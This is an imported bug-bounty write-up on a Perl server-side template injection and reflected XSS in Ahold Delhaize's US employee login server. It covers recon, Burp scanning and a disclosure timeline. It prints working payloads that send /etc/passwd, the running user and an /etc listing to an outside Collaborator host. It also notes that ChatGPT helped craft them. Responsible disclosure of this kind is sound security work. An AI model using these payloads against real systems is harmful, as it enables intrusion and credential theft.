---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-12-14_remote-code-execution-at-ws1aholdusacom-compromising-logins-of-ahold-delhaize-us.md
original_filename: 2023-12-14_remote-code-execution-at-ws1aholdusacom-compromising-logins-of-ahold-delhaize-us.md
title: Remote Code execution at ws1.aholdusa.com — Compromising logins of Ahold Delhaize
  USA employees for >3.5 years (or even 18 years?)
category: documents
detected_topics:
- sso
- xss
- command-injection
- automation-abuse
- csrf
- api-security
tags:
- imported
- documents
- sso
- xss
- command-injection
- automation-abuse
- csrf
- api-security
language: en
raw_sha256: db8f58fe97f6d40b48e15b7720fcae5cdc0c13e31d160f83446856058c4008d9
text_sha256: f848311c2054dabde16c21183f77ac19b18d1e1a7e9a0d1ebe87652adfb76cb0
ingested_at: '2026-06-28T07:32:28Z'
sensitivity: unknown
redactions_applied: false
---

# Remote Code execution at ws1.aholdusa.com — Compromising logins of Ahold Delhaize USA employees for >3.5 years (or even 18 years?)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-12-14_remote-code-execution-at-ws1aholdusacom-compromising-logins-of-ahold-delhaize-us.md
- Source Type: markdown
- Detected Topics: sso, xss, command-injection, automation-abuse, csrf, api-security
- Ingested At: 2026-06-28T07:32:28Z
- Redactions Applied: False
- Raw SHA256: `db8f58fe97f6d40b48e15b7720fcae5cdc0c13e31d160f83446856058c4008d9`
- Text SHA256: `f848311c2054dabde16c21183f77ac19b18d1e1a7e9a0d1ebe87652adfb76cb0`


## Content

---
title: "Remote Code execution at ws1.aholdusa.com — Compromising logins of Ahold Delhaize USA employees for >3.5 years (or even 18 years?)"
url: "https://medium.com/@jonathanbouman/remote-code-execution-at-ws1-aholdusa-com-compromising-logins-of-ahold-delhaize-usa-employees-c7c9aca7e05d"
authors: ["Jonathan Bouman (@JonathanBouman)"]
programs: ["Ahold Delhaize"]
bugs: ["RCE", "Reflected XSS", "SSTI"]
bounty: "300"
publication_date: "2023-12-14"
added_date: "2023-12-26"
source: "pentester.land/writeups.json"
original_index: 627
scraped_via: "browseros"
---

# Remote Code execution at ws1.aholdusa.com — Compromising logins of Ahold Delhaize USA employees for >3.5 years (or even 18 years?)

Remote Code execution at ws1.aholdusa.com — Compromising logins of Ahold Delhaize USA employees for >3.5 years (or even 18 years?)
Jonathan Bouman
11 min read
·
Dec 14, 2023

--

5

--

Background
Ahold Delhaize call themselves one of the biggest food retail groups. They handle 60 million customers a week, have been around for 150 years and are the employer to 414.000+ associates. They claim to be the leader in supermarkets and e-commerce. Also in 2020 won an award for their support of transparency in cybersecurity. They do this by encouraging people to share insights. Sounds good, let’s do that today!

As some of you know I love to hack companies that I use in my daily life and with Ahold Delhaize being the owner of Bol.com & Albert Heijn they are a good target. Furthermore they have a responsible disclosure policy so we can safely do our research and responsible disclose the issues after they are fixed. Last but not least we might even end up in their Wall of fame ;-).

Press enter or click to view image in full size
I made it to the Wall of Fame after reporting some bugs in the past

Discussion
Usually I put the discussion part of the report at the bottom of the write-up. But today it’s different. As this critical CVSS 10 bug went unpatched for longer than 3.5 years after reporting it. I strongly suspect this bug has been there since 2005. This has put their employees at risk for leaking their credentials. Since people often reuse passwords they should be informed about this potential leak.

The bug described in this blog was discovered on the 23th of April 2020. The same day the bug was confirmed by the Ahold security team; a good thing to confirm a vulnerability as soon as the report comes in.

I falsely assumed that it would be fixed immediately after the confirmation. A hard lesson learned: always check yourself for fixes after one month and try to keep track of all the bugs you report by email.

On the 2nd of November 2023 (>3.5 years later) I received an email stating that the bug was fixed. To my surprise I discovered on the 9th of November 2023 it was not fixed but is still vulnerable.

This time I properly exploited the bug and smuggled out the /etc/passwd file from the server as a proof of concept. You will read about that in detail below.

However the full server should be considered compromised for at least 3.5 years (or even 18 years?). As everyone could execute any code on the server. No authentication required & easy to discover.

The vulnerable server acts as a central identity provider. It allows users to login and reset their password, supporting different Ahold companies as seen on the help page. Not good.

Press enter or click to view image in full size
An example of the types of users using this server; distribution center users but also store users.

Recon
Ok. Enough introduction, time to hack!

When hacking a company we always try to find the most interesting and weakest asset possible. We want bang for bugs.

Btw. today we don’t hack for bucks as Ahold rewards a max 300 euros in gift cards (to put this in perspective, corporations like Shopify reward up to 200.000 dollars for RCE bugs), so today we do it solely to make the internet a bit safer.

With companies the size of Ahold Delhaize you have a big challenge to setup proper identity management systems. They acquire companies all the time and might need to work with old legacy systems. Systems that manage username, passwords and access levels of all employees.

If you compromise such a server it’s game over, as you could use this to perform lateral attacks and impersonate other users on different company assets.

So let’s hunt for those assets.

A good start is to try to figure out where employees login. Let me google that for you.

Press enter or click to view image in full size
Interesting https://ws1.aholdusa.com/ is used for their US employees to login

A quick look at the webdesign gives us 90s vibes, vibes we like as security researchers as it smells like legacy code and thus a high probability of security issues.

Press enter or click to view image in full size

A quick lookup shows us that another name for this server is: ldap-ws-vip.aholdusa.com.

LDAP, or Lightweight Directory Access Protocol, is a protocol used for accessing and maintaining distributed directory information services over an Internet Protocol (IP) network. It’s commonly used for organizing and locating diverse items in a network, like users, groups, devices, and permissions, making it a central part of many organizations’ IT infrastructures.

LDAP-WS-VIP.aholdusa.com is the cname of the server.

As we want to discover all the interesting endpoints (urls) on this LDAP server we need to be sure we also capture the old legacy ones that are not actively linked anymore.

A great tool to use for this is https://github.com/tomnomnom/waybackurls made by 
TomNomNom
.

The tool literally grabs all the archive.org data ever indexed of the supplied domain and displays you all the URLs / Endpoints it could find. This results in a lot of noise (also images and other files are showed), however when you filter the list on specific words you can quickly get a good result.

Press enter or click to view image in full size
Only show results with cgi-bin in the url (90s loved cgi-bin) and sort it

Those hits look like perl, a coding language used in the past to create websites, 90s baby! The extension.pl gives us the clue.

When visiting the page we see some form that one could submit.

Press enter or click to view image in full size
An interesting endpoint. Please note the Last change: 2005-Dec-15, so no ‘90s but ‘20s;-) Could it be that this bug has been there since 2005? If so, how was this missed during pentests?
Press enter or click to view image in full size
Archive.org indexed this page for the first time around 2007.

Finding a Server Side Template Injection bug
The next step is to open this page in the Burp Browser so we can capture all the browser traffic.

Press enter or click to view image in full size
When the form is submitted this request is made.

A common thing that I often do is looking for parameters that change the actual output in the response. That could easily lead to XSS and other type of bugs. A simple way to do this is using Burp Intruder, or Param Miner.

Today we use Burp Intruder, we send the request to the Intruder (right mouse click in the request window, send to intruder). Add a new mockup parameter to the POST body, add some random value, select the parameter name as the place where to inject our payloads and set the payload list to Form fields names - Long .

Press enter or click to view image in full size
Set the injection position
Press enter or click to view image in full size
Press Add from list, and press Start Attack
Press enter or click to view image in full size
We see our value gets reflected in the source code, we have reflected XSS!

We can quickly skim through the list of responses by sorting on Length , this allows us to see if the page is longer/shorter than normal. The normal length is 7095 so anything else is interesting. One of those hits is Version , and we can see in the source it reflects our 12345<u>a payload as HTML!

We can set the payload to some XSS payload and take over the browser session of any user that we can trick into visiting our specific url. A quick way to do this is create a good payload: 12345<script>alert`Hi-mom!`</script> , go back to Repeater and add the &version=12345<script>alert`Hi-mom!`</script> to the request. Press right mouse in the request window, pick Engagement Tools -> Generate CSRF PoC .

Now Burp creates you a working PoC that you could use to trigger the bug, upload the HTML to some webserver, lure the victim in opening that website and the bug executes.

Press enter or click to view image in full size
BONUS: Reflected XSS Proof of Concept

But what If we can do more with this reflecting bug? Whenever you run into a reflected XSS bug you should also check for Server Side Template Injection bugs. The impact of those bugs is often way higher as they allow you to execute code on the server, that is reflected in the source.

Get Jonathan Bouman’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

As we know the endpoint runs Perl (remember the extension in the URL) we now only scan for code injections related to Perl.

Start with creating a new Live Task in Burp, go to the Dashboard and smash that orange button.

Press enter or click to view image in full size
Open a new live task

Go to the Scan configuration tab and create a new scan configuration. Open the Issues Reported part and press the Select individual issues

Now select all the items in the list (Ctrl + A) and do a right mouse click, press Enabled. This essentially disables all the scans it will do otherwise, a good way to reduce noise and requests to the server. Now search for Perl and select the Perl Code injection option. Press save and you are ready to scan for code injections!

Press enter or click to view image in full size
Setup of the active scan, only check for Perl Code injections

Now back to the repeater with our version parameter that reflects. Now select the value of our XSS payload and press Save

Press enter or click to view image in full size
Add the endpoint and the specific variable to the active scan so it could check for Perl code injections

Now it’s time to get some coffee (or some good tea) and see if Burp Active Scanner could find a code injection bug. Bonus: Check the Logger tab in Burp and learn what payloads Burp uses.

Press enter or click to view image in full size
BANG! Burp just discovered a Perl code injection bug!

So we now have a request that let the server sleep for 20 seconds by injecting the payload{${sleep(lc(20))}} .

We can easily confirm this by sending the request to repeater (open the Request tab, right mouse on the request and send to repeater, in repeater resend the request and see it takes 20 seconds to load).

As sleep(20) as a payload is boring and not showing the actual impact to non technical people we need to create some payload that actually shows we can execute any code on the server.

This is takes time and responsibility (don’t break stuff and be proportional). Just be sure that leadership of the company will understand that the bug is indeed a CVSS 10 score, but don’t do that by exfiltrating all the user data.

What I often do is trying to demonstrate I could run any code and leak the /etc/passwd file to an external (attacker controlled) server. This file contains no real passwords, however it contains internal server information. The external server could be the the Burp Collaborator (or even better your own private Collaborator).

After 2 hours of trying I came up with the following payload leaking the /etc/passwd file:
version=${exec(‘perl -MMIME::Base64 -MLWP::UserAgent -e \’my $ua %3d LWP::UserAgent->new;my $response %3d $ua->post(\”http://1dfct18y9z1fai91sjr25xngn7tyhx5m.oastify.com\",Content_Type %3d> \”form-data\”, Content %3d> [file %3d> [\”/etc/passwd\”]]);\’’)}

Let me explain what it does:

Perl Code Execution: The payload within ${exec('...')} is Perl code, which is URL-encoded to ensure that it is transmitted properly over HTTP. The server interprets this code and executes it if it is vulnerable to SSTI.
LWP::UserAgent Module: This Perl module allows the code to make HTTP requests. The my $ua = LWP::UserAgent->new; part creates a new user agent object, which is capable of sending HTTP POST requests.
Making the POST Request: The $ua->post(...) function sends a POST request to the specified URL with the contents of the /etc/passwd file. This is a common target for attackers as it contains user account information.
Press enter or click to view image in full size
The request. Gives an error to the client, however the code is executed.
Press enter or click to view image in full size
The /etc/passwd file is leaked to our server! Note the very outdated perl module version 5.69

One might think “Sir. You need extensive knowledge of Perl to do this”. Wrong!

Press enter or click to view image in full size
ChatGPT 4 to the rescue

I tried all those options and the third one (after replacing the jo.ax.com domain with our burp collaborator url) triggered an incoming DNS request. Resolving a domain name is often the quickest way to discover if you have some code execution on a server. Just monitor any incoming DNS requests in Burp Collaborator!

After that it was a matter of the giving ChatGPT 4 the right prompts to create a payload that actually leaked the /etc/passwd file.

Press enter or click to view image in full size
Want to speed up creating payloads? Use ChatGPT

Bonus payloads
Get the current linux user that executes the perl process (‘nobody’)

ssn=1234&mmdd=1234&name=asdadaw&login-form-type=initial_entry&version=${exec(‘perl -MMIME::Base64 -MLWP::UserAgent -e \’my $ua %3d LWP::UserAgent->new; my $user %3d getpwuid($<);my $response %3d $ua->post(\”http://1dfct18y9z1fai91sjr25xngn7tyhx5m.oastify.com\",Content_Type %3d> \”form-data\”, Content %3d> $user);\’’)}

Show the directory contents of /etc/ (a long list of files and backup files)

ssn=1234&mmdd=1234&name=asdadaw&login-form-type=initial_entry&version=${exec('perl -MMIME::Base64 -MLWP::UserAgent -e \'my $ua %3d LWP::UserAgent->new;opendir(DIR,\"/etc/\");my @files %3d readdir(DIR); closedir(DIR);my $response %3d $ua->post(\"http://1dfct18y9z1fai91sjr25xngn7tyhx5m.oastify.com\",Content_Type %3d> \"form-data\", Content %3d> join(\"\n\", @files));\'')}

Conclusion
We demonstrated today that we could fully compromise the ws1.aholdusa.com server. An identity management system / LDAP server. I discovered the bug 3.5 years ago, however it’s likely to be there since 15-Dec 2005.

All data of users/employees/customers/suppliers using this server should be considered compromised as we demonstrated full remote code execution and being able to setup outbound connections to our own server.

It is impossible to know if the server was not compromised by a malicious actor, as that requires extensive logs. In this situation logs that contain POST body values. Something you would avoid at all costs in this application as that would also leak usernames and passwords in plain text (remember the affected endpoint is used to login users). Additionally these logs would need to need to go back 18 years in order to prove that this vulnerability was never exploited.

Timeline
2020–04–23 — Reported the bug to Ahold security team, see email below.

Press enter or click to view image in full size
Initial report (Censored some names from individuals at Ahold, I put them in the To)

2020–04-23 — Ahold confirmed the bug, promises to keep me informed.

Press enter or click to view image in full size
The reply after 3.5 years (Censored the names of the individuals). One might ask why the Team Cyber Defense did not check themselves if it was really fixed.

2023–11–02 — Ahold requests me to confirm bug fix and supply proof it is fixed
2023–11–06 —Ahold emails again to request me to confirm the bug is fixed (I did not have time to reply sooner)
2023–11–06 — Replied I’m surprised why the bug was not fixed sooner, requested information about that and promised them to check if it’s fixed.

Press enter or click to view image in full size
Request about what went wrong in the follow up, computer says no. Advice to companies; be human, use first names, build up relationships with researchers and explain why stuff went wrong. Transparency is trust.

2023–11–09 — Confirmed that the bug still exists, created a full RCE payload and wrote this blog. Shared it with the security team. Requested responsible disclosure within 30 days as potentially a lot of employees their credentials are compromised due to this bug.
2023–11–09— Informed Ahold Delhaize Data Protection Officer about the existence of this report, as this hits a large amount of employees.
2023–11–10 — Ahold requests my Paypal to send a reward.
2023–11–13 — Ahold rewarded this bug 300 euros

We won the max bounty at Ahold; 300 euros

2023–11–13 —Endpoint is still vulnerable, reached out by phone to the privacy officer of Ahold Delhaize to share my worries and request this report to be escalated.
2023–11–15 — Ahold informs me the endpoint is fixed. However after some tests; the endpoint is not fixed. It only redirects to a 404 when one requests the endpoint using the GET HTTP method. The exploit still works as the exploit uses the POST HTTP method. Added two new payloads (check current user; nobody and list of files in /etc/). Emailed Ahold my feedback & worries.
2023–11–17— Endpoint is still vulnerable
2023–11–20 — Ahold informs me the bug is resolved. I confirmed the fix. Requested to disclose this write-up, offered Ahold to add their own paragraph to the write-up.
2023–11–27 — No reply on request to disclose, sent reminder. Ahold replies they need more time.
2023–12–07 — Requested an update
2023–12–08 — Ahold informs me after internal debate they don’t want to use the opportunity to add a paragraph.
2023–12–14 — Disclosed the above write-up
